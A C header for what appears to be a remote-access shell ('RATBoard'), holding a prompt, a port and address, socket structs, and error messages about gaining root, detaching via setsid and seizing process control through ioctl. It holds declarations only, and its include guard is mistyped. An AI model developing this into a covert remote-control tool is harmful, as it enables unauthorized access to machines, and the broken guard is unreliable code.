/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

#ifndef NETSHELL_H
#define NETSHELL _H

# define false	0
# define true	1
# define bool	char

# define RATZ_PROMPT	"\e[1;32mRATBoard =>\e[0m "

# define RATZ_BUILTIN_HELP	""

# define RATZ_STRSTR_NONE	"none"
# define RATZ_STRSTR_GR		"gr"
# define RATZ_STRSTR_PR		"pr"
# define RATZ_STRSTR_SID	"sid"
# define RATZ_STRSTR_CTL	"ctl"

# define RATZ_NO_ER			"\e[32merror logs \e[0m"
# define RATZ_TRY_ROOT_ER	"\e[31mRazmo : \e[0mFailed to be root.\n"
# define RATZ_TRY_GROOT_ER	"\e[31mRazmo : \e[0mFailed to be in root group.\n"
# define RATZ_SETSID_ER		"\e[31mRazmo : \e[0mCan not detach, and be the session leader.\n"
# define RATZ_IOCTL_ER		"\e[31mRazmo : \e[0mCan not take control of his process.\n"

# define PORT		8081
# define ADDRESS	"127.0.1.1"

# define DEBUG_SIZE_MAX	1024

# define _XOPEN_SOURCE	700

# include <sys/socket.h>
# include <arpa/inet.h>

# include <sys/ioctl.h>
# include <errno.h>
# include <signal.h>
# include <fcntl.h>
# include <string.h>
# include <unistd.h>
# include <stdio.h>
# include <stdlib.h>

# include <readline/readline.h>
# include <readline/history.h>

typedef struct sockaddr_in	s_sockaddr_in;
typedef struct sockaddr		s_sockaddr;

typedef struct net
{
	s_sockaddr_in	addri;
	socklen_t		len;
	int				in;
	int				out;
}	s_net;

typedef struct nshell
{
	char*	buffer;
	char	msg[DEBUG_SIZE_MAX];
	int		len;
	bool	killed;
	s_net	net;
}	s_nshell;

#endif
